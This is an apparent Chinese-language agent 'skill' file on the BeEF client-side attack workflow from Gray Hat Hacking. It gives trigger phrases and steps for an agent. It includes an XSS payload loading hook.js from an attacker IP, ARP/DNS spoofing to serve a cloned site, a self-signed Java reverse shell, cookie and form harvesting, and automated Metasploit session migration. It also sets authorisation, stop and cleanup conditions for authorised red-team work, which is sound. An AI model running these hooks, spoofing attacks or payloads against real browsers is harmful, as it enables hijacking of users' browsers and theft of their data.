# BeEF 客户端攻击工作流

## R — 原文 (Reading)

> "BeEF框架使用了大量不同的技术，但是挂钩浏览器是所有技术的基础。"
>
> "如果某人关闭一个标签页或者导航到其他页面，可能丢失挂钩。"
>
> — Daniel Regalado 等，《灰帽黑客 第4版》第18章 18.1、18.5

---

## I — 方法论骨架 (Interpretation)

1. **挂钩投递**：先让目标浏览器加载 hook.js 并持续回连，路径按可控位置选择——反射 XSS、克隆站点加 DNS 欺骗、链路层 HTTP 注入。价值是把“一次脚本执行”变成“持续控制通道”；失败点是弹窗成功但控制台没有活动条目。
2. **挂钩校验**：以 Hooked Browsers 中的在线条目和心跳为准，而不是页面是否弹窗、是否报错。价值是避免后续模块全部打空；失败点是把旧挂钩离线误判为工具故障。
3. **浏览器层指纹**：收集类型、版本、UA、插件与组件，决定可选漏洞与模块。价值是给模块编排提供依据；失败点是只记 UA，漏掉插件与版本差异。
4. **用户层指纹**：读取 cookie、未提交表单、本地/会话存储与浏览痕迹，评估凭据与个人信息暴露。价值是回答“被控后泄露什么”；失败点是忽略 HTTPOnly，把拿不到会话 cookie 误判为模块失效。
5. **主机与网络层指纹**：借 Java 等组件获取 OS、Java 版本、网卡、内网 IP 与存活主机。价值是把浏览器问题扩展为内网影响面；失败点是用户不接受 applet，导致结果永远为空。
6. **模块判读**：把绿/橙/灰/红读成“生效概率 + 用户可察觉度”二维，优先绿灯收集，谨慎使用橙/灰，红灯不投入时间。价值是快速筛出“能打且不易暴露”的组合；失败点是把颜色当保证，不做实测。
7. **模块编排**：按“先收集、后攻击、再横向”排序，避免在单个模块上反复试错。价值是让有限挂钩窗口产出最大信息量；失败点是顺序颠倒，攻击动作先暴露目标。
8. **载荷联动**：JavaPayload 或 Metasploit 把浏览器控制转成系统会话，前提是扩展已启用、监听与回连地址匹配。价值是从“浏览器内”走到“系统级”；失败点是默认扩展未启用、自签名证书弹窗吓退用户。
9. **会话保持**：拿到 Meterpreter/Javashell 后立即迁移出浏览器进程。价值是避免标签关闭或浏览器崩溃带走全部会话；失败点是多个会话共享同一浏览器 PID。
10. **自动化**：用 REST API/Autorun 轮询新挂钩浏览器，按数组顺序自动执行收集与攻击。价值是抢在用户离开页面前完成秒级流水线；失败点是人工逐模块点击，挂钩在结果返回前已丢失。

## A1 — 书中的应用 (Past Application)

### 案例 1: 实验18-2/18-3 — 用 basic demo 与反射 XSS 完成首次挂钩

- **问题**: 刚部署 BeEF，需要确认安装可用，并分清“XSS 弹窗成功”与“浏览器已被持续挂钩”的区别。
- **方法论的使用**: 启动 BeEF 后访问 `/ui/panel`，用默认 `beef/beef` 登录，点击 basic demo page 在新标签页加载；随后在 Kali 建 echo.php 确认反射 XSS 可执行，把 payload 换成 `<script src="http://192.168.192.10:3000/hook.js"></script>` 并 URL 编码后发给目标。
- **结论**: 挂钩判据是控制台出现带浏览器/OS/VM 信息的活动条目，而不是页面有无可见变化；basic demo 与反射 XSS 都能建立同一条回连通道。
- **结果**: 本机 127.0.0.1 出现在 Hooked Browsers；Windows 7 上的 Firefox 29 被 XSS URL 挂钩，页面无可见变化但指纹已可读取。

### 案例 2: 实验18-4 — 克隆站点加 DNS 欺骗，实现无点击挂钩

- **问题**: 目标不会点击钓鱼链接，但会主动访问固定站点；需要在其正常浏览路径上完成挂钩。
- **方法论的使用**: 把 BeEF 监听从 3000 改到 80 并绑定攻击机 IP，用 clone_page API 克隆 blog.beefproject.com 并挂载到根路径；在 etter.dns 写入指向攻击机的 A 记录，启动 Ettercap 的 dns_spoof 与 ARP 欺骗，让目标访问原域名时落到克隆页。
- **结论**: 可控 DNS/链路位置加上目标固定访问习惯，可以在不点击恶意链接的情况下自动注入 hook.js；改端口会让旧 hook.js 继续回连旧地址，原有挂钩全部离线。
- **结果**: 目标访问原域名即被引到克隆页并自动挂钩；博客类站点停留时间长，为后续指纹与模块攻击提供了窗口。

### 案例 3: 实验18-9 与 18.5 — JavaPayload 反弹 Javashell，Autorun 压缩到秒级

- **问题**: 浏览器层信息不足以证明系统级影响；同时人工逐模块操作太慢，用户随时可能关闭标签而丢失挂钩。
- **方法论的使用**: 构建 JavaPayload，用 ant 生成 `Applet_ReverseTCP.jar`，以 keytool/jarsigner 自签名后复制到 BeEF 模块目录；用 StagerHandler 在 6666 端口起监听，再在已挂钩浏览器执行 Java Payload 模块。随后配置 Autorun 的 REST 端点、凭据与 `autorun_mods`，把浏览器指纹、Get Cookie、Get System Info、隐藏 iframe 依次放入数组并轮询新挂钩浏览器。
- **结论**: Java 负载必须得到受害者接受才能运行，自签名会弹证书警告，真实社工应改用受信任证书；自动化能把“指纹→收集→攻击”压进挂钩窗口，而进程迁移决定会话能否在浏览器崩溃后存活。
- **结果**: 用户点击 Run 后 Javashell 返回 `net user` 输出，列出 Administrator/Guest/sussurro；Autorun 在数秒内返回 cmd1–4 的模块结果并触发 BrowserAutopwn 流量，Metasploit 会话建立后自动迁移出浏览器进程。

## A2 — 触发场景 (Future Trigger) ★

### 用户会在什么情境下需要这个 skill?

1. 已获授权的红队或钓鱼演练，需要证明“员工浏览器被控后能泄露什么、能走到哪一步”，而不只是交一个 XSS 弹窗截图。
2. 已有一个可执行 JavaScript 的反射或存储型 XSS 点，想把它变成可持续回连、可远程执行模块的客户端控制通道。
3. 需要评估浏览器侧影响面：cookie、未提交表单、本地存储、插件、主机信息与内网存活主机。
4. 需要在挂钩后投递 JavaPayload 或 Meterpreter，或把收集与攻击动作自动化，避免人工点击期间挂钩丢失。
5. 蓝队或报告阶段需要解释 BeEF 类框架的挂钩判据、模块可见性、默认配置风险与检测痕迹。

### 语言信号 (用户的话里出现这些就应激活)

- "XSS 只能弹窗，怎么证明能控制浏览器"
- "BeEF 怎么挂钩 / hook.js 怎么投递"
- "Browser Rider 能拿来做什么"
- "Autorun 怎么配置，为什么模块还没跑完就离线了"
- "JavaPayload 怎么反弹 shell"
- "红队钓鱼怎么评估客户端影响"
- "BeEF hook / client-side attack / browser Rider / Autorun"

### 与相邻 skill 的区分


- 与 `web-encoding-filter-bypass` 的区别: 后者解决“已有过滤或 WAF 时，如何利用编码与规范化差异让脚本真正执行”；本 skill 从脚本已经能在目标源执行之后接手，关注挂钩维持、指纹、模块编排与客户端影响，不负责构造编码绕过。
- 与 `non-memory-vulnerability-analysis` 的区别: 后者讲 XSS/SQLi 等非内存漏洞的基础原理、注入点识别与通用 payload；本 skill 不重复基础教学，只处理“已有执行点之后如何做客户端控制与影响评估”。
- 与 `exploit-chain-construction` 的区别: 后者构造内存破坏漏洞的完整利用链（信息泄露、绕过保护、控流）；本 skill 使用 BeEF 做框架化后渗透，可能调用 Metasploit，但不负责 UAF/堆喷射等利用开发。
- 与 `metasploit-module-development` 的区别: 后者编写漏洞利用模块；本 skill 只编排已有模块与载荷，把浏览器挂钩转成会话。

## E — 可执行步骤 (Execution)

当 skill 被激活后，agent 应按以下步骤执行:

1. **确认授权与影响边界**
   - 完成标准: 写明目标用户、域名/网段、允许的挂钩方式、禁止动作、数据处置与停止条件。
   - 判停条件: 无书面授权，或 ARP/DNS 欺骗会影响生产网络 → 停止，改为只做只读影响评估。

2. **先修 BeEF 部署配置**
   - 完成标准: 已修改 config.yaml 默认凭据、管理接口仅对受信网段开放、监听地址与端口符合投递方案。
   - 判停条件: 默认凭据未改 → 先修配置，不得启动对外服务；控制台已暴露公网 → 先下线并限制访问。

3. **选择并验证挂钩投递路径**
   - 完成标准: 反射 XSS、克隆站点加 DNS 欺骗或流量注入中至少一条路径成功，Hooked Browsers 出现带心跳的活动条目。
   - 判停条件: 只有弹窗、没有活动条目 → 回到投递路径排查；修改监听端口后旧挂钩离线 → 重新投递，不把离线当模块故障。

4. **采集浏览器层指纹**
   - 完成标准: 记录浏览器类型/版本、UA、插件与组件，并据此列出候选模块。
   - 判停条件: 目标浏览器过新、对应模块普遍失效 → 停止漏洞利用尝试，改为影响面评估（能读什么数据、能访问什么内网资源）。

5. **采集用户层信息**
   - 完成标准: 取得可读 cookie、未提交表单、本地/会话存储等，并标注每项来源与敏感级别。
   - 判停条件: 目标已登录但只拿到非敏感 cookie → 检查 HTTPOnly，结论写“DOM 不可读”，不得判定模块失效。

6. **采集主机与网络层信息**
   - 完成标准: 取得 OS、Java/组件版本、网卡、内网 IP 与存活主机列表，形成影响面清单。
   - 判停条件: 用户不接受 Java applet → 记录为“未授权运行”，改走纯 JavaScript 模块；目标无可用 Java → 跳过该层。

7. **按颜色与隐蔽性编排模块**
   - 完成标准: 绿灯模块优先收集，橙/灰模块标注限制与可察觉性，红灯模块不投入；每个模块记录结果或失败原因。
   - 判停条件: 模块连续无返回且浏览器仍在线 → 回到指纹核对版本/插件，不重复盲试。

8. **联动载荷前先核对前置条件**
   - 完成标准: Metasploit 侧 msgrpc 已启动、BeEF 的 metasploit 扩展已启用并重启、LHOST/SRVHOST 与监听端口匹配；JavaPayload 已完成构建、签名与模块目录复制。
   - 判停条件: 扩展默认未启用或模块树为空 → 先改 config.yaml 并重启；自签名证书弹窗导致用户拒绝 → 停止社工链，改用受信任证书或改走其他影响证明。

9. **建立会话后立即迁移并验证**
   - 完成标准: Meterpreter/Javashell 可用，进程已迁出浏览器，记录会话类型、PID 与稳定性。
   - 判停条件: 多个会话仍共享浏览器 PID → 先迁移再做信息收集与横向，否则不得继续扩大动作。

10. **自动化、留证与收尾**
    - 完成标准: Autorun/REST API 按“指纹→收集→攻击”排序执行并保存模块结果；测试结束后清理挂钩、会话、克隆站点、DNS/ARP 配置并恢复网络。
    - 判停条件: 用户页面生命周期短于人工操作 → 必须用 Autorun；无法恢复网络配置 → 停止测试并上报。

## B — 边界 (Boundary) ★

### 不要在以下情况使用此 skill

- **现代浏览器已移除 Java/Flash，目标环境不再具备相应插件**: GetSystemInfo、JavaPayload、依赖 applet 或旧插件的模块会直接失效；此时应把目标改为“影响面评估”，而不是反复尝试复现书中利用。
- **没有书面授权或会影响生产网络**: 挂钩、克隆站点、DNS/ARP 欺骗都属于主动干预；缺乏 SOW 时等同于入侵，可能造成断网与业务中断。
- **只需证明 XSS 存在，不需要客户端控制**: 一个可复现的弹窗或 DOM 执行证据即可交付；引入 BeEF 只会扩大影响面与操作风险。
- **主目标在服务端、内网或二进制层**: 本 skill 只回答浏览器被控后的影响，不替代服务端漏洞、横向移动或内存利用。
- **目标浏览器过新、旧模块普遍红灯**: 不要用“模块没反应”推导“没有风险”；应转向数据暴露、权限边界与检测能力评估。

### 作者在书中警告的失败模式

- **ce123 沿用 `beef/beef` 默认凭据**: 控制台暴露在公共网络时，他人可直接登录并接管所有已挂钩浏览器。
- **ce124 继续监听不常见的 3000 端口**: URL 带非标准端口，目标或安全设备容易察觉，克隆页也不像原站。
- **ce125 改监听端口后忘记旧挂钩会离线**: hook.js 的回连地址在注入时已固定，换端口后旧页面无法通信。
- **ce126 以为 GetCookie 能拿到全部 cookie**: HTTPOnly cookie 对 JavaScript 不可见，拿不到会话票据不等于模块无效。
- **ce127 默认用户会接受 Java applet**: 未点击接受时模块根本不会执行，结果为空不是“不兼容”。
- **ce128 自签名证书弹窗暴露攻击**: 浏览器提示发布者未知，目标警觉并拒绝运行。
- **ce129 对整段网络做 ARP 投毒**: 大量主机断网、网关异常，测试暴露并造成业务事故。
- **ce130 以为 BeEF 的 Metasploit 扩展开箱即用**: 扩展默认关闭，缺 msgrpc 与 config.yaml 配置时模块树为空。
- **ce131 手动逐模块操作导致挂钩丢失**: 用户关闭标签或跳转后，收集与攻击半途而废。
- **ce132 BrowserAutopwn 会话不迁移导致全丢**: 会话寄生在浏览器进程，浏览器崩溃即带走全部会话。

### 作者的盲点 / 时代局限

- **BeEF 版本与命令是 2015 年前后的快照**: 书中 `/ui/panel`、config.yaml 字段、clone_page API、Autorun 的 `autorun_mods` 与 REST 端点在后续版本中可能变化，不能照抄。
- **Java applet 已淘汰**: 现代浏览器移除 NPAPI，Java 插件不再普遍可用；GetSystemInfo、JavaPayload、Java7 Applet 等链路只在旧环境或专门靶场成立。
- **Flash 已终止支持**: 依赖 Flash 的客户端攻击与插件探测在今天没有现实基础。
- **BrowserAutopwn 的“广撒网”依赖旧漏洞**: 面对已打补丁的现代浏览器，命中率极低且易导致浏览器崩溃，书中的成功不能外推。
- **实验默认关闭或削弱保护**: 本地靶场、Host-Only 网络、默认凭据、自签名证书都是实验前提；生产环境还需考虑 HTTPS/HSTS、EDR、代理与日志。
- **以工具操作为中心**: 书中较少讨论检测工程、隐私合规与测试后恢复；下游必须把授权、影响控制与清理写入执行步骤。

### 容易混淆的邻近方法论

- **XSS 利用 vs 客户端控制**: 前者以获得一次脚本执行、证明漏洞为目标；后者以持续挂钩、模块化控制与影响评估为目标。
- **编码绕过 vs 挂钩投递**: `web-encoding-filter-bypass` 解决“怎么让脚本执行”；本 skill 解决“执行之后怎么维持与利用”。
- **浏览器漏洞利用链 vs BeEF 后渗透**: `exploit-chain-construction` 处理内存破坏与保护绕过；BeEF 处理已控浏览器的编排，二者可在 Metasploit 处衔接但不等价。
- **ARP/DNS 欺骗 vs 客户端攻击**: 欺骗只是投递手段；没有挂钩、指纹与影响结论，不能把“流量被劫持”当成“客户端已被控制”。
